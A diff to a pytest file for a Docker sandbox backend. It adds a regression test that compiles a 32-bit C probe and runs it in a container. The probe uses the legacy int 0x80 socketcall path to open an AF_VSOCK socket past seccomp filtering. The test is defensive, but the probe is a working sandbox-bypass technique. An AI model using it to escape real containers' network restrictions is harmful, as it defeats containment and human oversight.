@@ -35,6 +35,8 @@ Two tiers here, gated differently on purpose:
     reported honestly, not assumed).
 """
 import os
+import shutil
+import tempfile
 import subprocess
 
 import pytest
@@ -467,3 +469,112 @@ async def test_a2_uts_namespace_container_hostname_is_independent_of_host(backen
         assert change_attempt.returncode != 0
     finally:
         await backend.destroy(handle)
+
+
+# ======================================================================
+# A9/C3 — the exploit as a permanent regression/consistency check, not
+# just a one-off manual reproduction. Needs gcc-multilib (a genuine
+# 32-bit static binary — an inline `int $0x80` from a 64-bit process
+# was tried first and is wrong: its pointers aren't 32-bit-representable
+# and the kernel returns EFAULT). Skipped, separately from
+# _needs_docker, when that toolchain isn't available.
+# ======================================================================
+
+_SOCKETCALL_PROBE_C = r"""
+#include <stdio.h>
+#include <errno.h>
+#include <string.h>
+#include <unistd.h>
+
+#define SYS_SOCKET 1
+
+long int80_socketcall(int call, long a0, long a1, long a2) {
+    long args[3] = {a0, a1, a2};
+    long ret;
+    __asm__ volatile ("int $0x80" : "=a" (ret) : "a" (102), "b" (call), "c" (args) : "memory");
+    return ret;
+}
+
+int main(int argc, char **argv) {
+    int domain = atoi(argv[1]);
+    int type = atoi(argv[2]);
+    long ret = int80_socketcall(SYS_SOCKET, domain, type, 0);
+    if (ret < 0) {
+        printf("FAILED errno=%ld\n", -ret);
+        return 1;
+    }
+    char linkpath[64], target[256];
+    snprintf(linkpath, sizeof(linkpath), "/proc/self/fd/%ld", ret);
+    ssize_t n = readlink(linkpath, target, sizeof(target) - 1);
+    if (n >= 0) {
+        target[n] = '\0';
+        printf("SUCCEEDED fd=%ld target=%s\n", ret, target);
+        return 0;
+    }
+    printf("SUCCEEDED fd=%ld target=UNKNOWN\n", ret);
+    return 0;
+}
+"""
+
+
+def _can_build_32bit_probe() -> bool:
+    try:
+        r = subprocess.run(
+            ["gcc", "-m32", "-x", "c", "-static", "-o", "/dev/null", "-"],
+            input=_SOCKETCALL_PROBE_C, capture_output=True, text=True, timeout=15,
+        )
+        return r.returncode == 0
+    except Exception:
+        return False
+
+
+_needs_32bit_toolchain = pytest.mark.skipif(
+    not _can_build_32bit_probe(), reason="requires gcc-multilib (a real 32-bit static toolchain)"
+)
+
+
+@_needs_docker
+@_needs_32bit_toolchain
+@pytest.mark.asyncio
+async def test_a9_af_vsock_socketcall_bypass_is_consistent_with_lsm_state(tmp_path):
+    """The exploit, kept alive as a check rather than left as a one-off
+    manual finding. AF_VSOCK=40, SOCK_STREAM=1 (see docker_backend.py's
+    _lsm_active() docstring for the full account of what was tried and
+    why a seccomp-profile fix does not work here).
+
+    Only one direction is asserted: when no LSM is active (this host,
+    today), the bypass MUST be observably open — that is the current,
+    honest, verified state, and if it ever silently stops being true
+    without a corresponding code/doc update, this should fail loudly,
+    not pass quietly. When an LSM *is* active, this only reports the
+    result rather than asserting one, since _lsm_active() confirms
+    presence, not that the specific deny rule is loaded.
+    """
+    from core.sandbox.backends.docker_backend import _lsm_active
+
+    probe_dir = tmp_path / "probe"
+    probe_dir.mkdir()
+    src_path = probe_dir / "probe.c"
+    bin_path = probe_dir / "probe"
+    src_path.write_text(_SOCKETCALL_PROBE_C)
+    build = subprocess.run(
+        ["gcc", "-m32", "-static", "-o", str(bin_path), str(src_path)],
+        capture_output=True, text=True,
+    )
+    assert build.returncode == 0, build.stderr
+
+    AF_VSOCK, SOCK_STREAM = 40, 1
+    result = subprocess.run(
+        ["docker", "run", "--rm", "-v", f"{probe_dir}:/probe:ro", "ocbrain-test/base:local",
+         "/probe/probe", str(AF_VSOCK), str(SOCK_STREAM)],
+        capture_output=True, text=True,
+    )
+    bypass_open = "SUCCEEDED" in result.stdout and "socket:[" in result.stdout
+
+    if not _lsm_active():
+        assert bypass_open, (
+            "AF_VSOCK via socketcall unexpectedly blocked with no LSM active — "
+            "if this host gained a real mitigation, update _lsm_active() and "
+            "this test together rather than leaving them inconsistent: "
+            f"{result.stdout!r}"
+        )
